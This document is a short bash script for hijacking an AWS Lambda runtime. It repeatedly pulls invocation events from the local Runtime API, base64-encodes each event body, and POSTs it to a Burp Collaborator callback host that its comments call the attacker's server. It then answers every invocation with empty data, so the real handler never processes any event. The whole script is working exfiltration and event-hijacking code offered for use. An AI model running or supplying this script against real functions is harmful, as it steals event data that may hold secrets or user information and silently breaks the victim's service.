#!/bin/bash

# Replace with your desired callback URL. Event data will be POSTed here.
MYURL="od507fcc1svvyc3nz2y40z2h0862uuij.oastify.com";

# Retrieve event payload
echo "[+] Retrieving details for current event";
URL="http://127.0.0.1:9001/2018-06-01/runtime/invocation/next";

# Request the Lambda Runtime API and save the 'Lambda-Runtime-Aws-Request-Id' header and response body
curl -sD "./header" -o "./body" "$URL";
REQUEST_ID=$(cat "./header" | grep "Lambda-Runtime-Aws-Request-Id:" | awk '{print $2}' | awk '{$1=$1};1');
REQUEST_ID="${REQUEST_ID//$'\r'/}"
DATA=$(cat "./body" | base64);
echo "[+] Captured new event. Request ID: $REQUEST_ID";
if [ -z "$REQUEST_ID" ]; then
  echo "[-] Request ID header not found in the response."
  exit 1
fi

# Send data back to attacker HTTP server
echo "[+] Sending event data to $MYURL";
curl -X POST -d "$DATA" "$MYURL";

# HTTP POST request using the extracted Request ID
POST_URL="http://127.0.0.1:9001/2018-06-01/runtime/invocation/$REQUEST_ID/response";
echo "[+] Terminating event with request ID: $REQUEST_ID. Posting null data to $POST_URL";
curl -X POST -d "" "$POST_URL";

# Wait for new events, exfiltrate the data, and terminate them
while true
do
    echo "[+] Waiting for new event";
    curl -sD "./header" -o "./body" "$URL";
    echo "[+] Captured new event. Request ID: $REQUEST_ID";
    REQUEST_ID=$(cat "./header" | grep "Lambda-Runtime-Aws-Request-Id:" | awk '{print $2}' | awk '{$1=$1};1');
    REQUEST_ID="${REQUEST_ID//$'\r'/}"
    DATA=$(cat "./body" | base64);
    
    echo "[+] Sending event data to $MYURL";
    curl -X POST -d "$DATA" "$MYURL";

    echo "[+] Terminating event with request ID: $REQUEST_ID"
    POST_URL="http://127.0.0.1:9001/2018-06-01/runtime/invocation/$REQUEST_ID/response";
    curl -X POST -d "" "$POST_URL";
done
